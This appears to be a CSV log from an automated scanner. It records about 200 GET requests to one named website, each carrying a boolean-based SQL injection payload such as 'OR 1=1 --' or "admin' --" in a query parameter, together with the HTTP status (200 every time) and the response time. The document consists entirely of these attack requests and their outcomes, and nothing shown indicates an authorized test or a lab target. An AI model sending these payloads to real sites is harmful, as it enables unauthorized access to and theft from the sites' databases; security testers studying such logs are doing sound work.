URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.3959617614746094,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.0297877788543701,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.39461183547973633,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0355706214904785,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3854343891143799,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.39022350311279297,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3911263942718506,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.39137768745422363,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.43863701820373535,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.0164480209350586,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.46263909339904785,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1192336082458496,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9810376167297363,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.4562718868255615,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.0287156105041504,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1423852443695068,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1052660942077637,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0262587070465088,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.023247241973877,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.0625641345977783,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.0232298374176025,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4975597858428955,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.0081686973571777,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.9824907779693604,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1013598442077637,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9825499057769775,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.959176778793335,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.967235803604126,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.072615146636963,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9226632118225098,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.38158702850341797,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.4338564872741699,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.4318125247955322,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4321615695953369,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4235539436340332,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.0147414207458496,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.846257209777832,' OR 1=1--
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.35971832275390625,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8236157894134521,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7521853446960449,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.32256221771240234,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.8099360466003418,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.9355354309082031,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7929449081420898,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7770893573760986,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7147305011749268,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.29244279861450195,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7734906673431396,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.8020284175872803,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2979471683502197,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2732367515563965,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.27384448051452637,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2862725257873535,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3052079677581787,admin' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.20320749282836914,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2037353515625,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2604498863220215,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2682065963745117,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.2684781551361084,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2762112617492676,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.16225576400756836,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.1644597053527832,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.16007447242736816,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.32943296432495117,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.16096973419189453,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.33031296730041504,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.16085386276245117,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.16243290901184082,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.1628415584564209,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.1633284091949463,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.16380524635314941,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.3286550045013428,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.20185589790344238,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.19997024536132812,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.1930251121520996,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.16324353218078613,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.16361308097839355,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.20159077644348145,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.20292878150939941,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.9506075382232666,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.0854244232177734,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9511923789978027,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.20803332328796387,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.20629262924194336,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.21163558959960938,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.20409727096557617,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.20687437057495117,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.2077932357788086,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.208343505859375,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.23382210731506348,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.21092915534973145,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.6837046146392822,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2600407600402832,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2605094909667969,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2572968006134033,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.26259374618530273,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2605466842651367,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.262829065322876,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2608070373535156,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2630949020385742,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.24573493003845215,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.24832677841186523,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.25835156440734863,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.25569868087768555,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2566978931427002,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.22561311721801758,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2353677749633789,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.24147748947143555,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.24334979057312012,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.24799370765686035,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.24999403953552246,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1494615077972412,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7746343612670898,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.24912786483764648,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.22612953186035156,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2279822826385498,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.23819422721862793,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.7512071132659912,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1453502178192139,admin' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.21582555770874023,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7400991916656494,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.20311760902404785,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.20558691024780273,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.20980072021484375,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.21485400199890137,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.21134424209594727,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.21789979934692383,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2372114658355713,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.24508094787597656,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.24558258056640625,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.24750328063964844,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.0028979778289795,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7464745044708252,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.0050859451293945,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.21049094200134277,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.21160030364990234,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.20974397659301758,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2118234634399414,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.22958898544311523,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.9226534366607666,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.7388832569122314,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.9806180000305176,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2117297649383545,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.21268820762634277,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2134535312652588,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.21478939056396484,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9285640716552734,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8223850727081299,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.20756268501281738,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2080240249633789,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.20837998390197754,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.21088480949401855,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.20862054824829102,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.20909476280212402,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2103593349456787,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.21169137954711914,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.221245288848877,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.20466852188110352,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.20305609703063965,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.8416228294372559,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.19565463066101074,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.20566391944885254,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1917598247528076,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.8210937976837158,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.635190486907959,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.18813157081604004,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.18002581596374512,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.5404150485992432,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.6316800117492676,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.8374204635620117,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.5351231098175049,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2786154747009277,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5363044738769531,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2615966796875,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.49030160903930664,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.44933485984802246,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5140485763549805,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5124728679656982,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.53314208984375,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.5339932441711426,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.21547937393188477,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8146572113037109,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5262320041656494,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2149183750152588,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3536691665649414,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.4206559658050537,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.5250070095062256,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.175267219543457,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7933862209320068,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.5390939712524414,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5413417816162109,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5361828804016113,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.5380823612213135,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1602351665496826,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.1508491039276123,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.9803450107574463,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.5207090377807617,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.0067129135131836,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.9816644191741943,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.5022039413452148,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.31250429153442383,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.503725528717041,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3015897274017334,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.3907465934753418,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.5537281036376953,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.994814395904541,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.9551906585693359,' OR 'x'='x
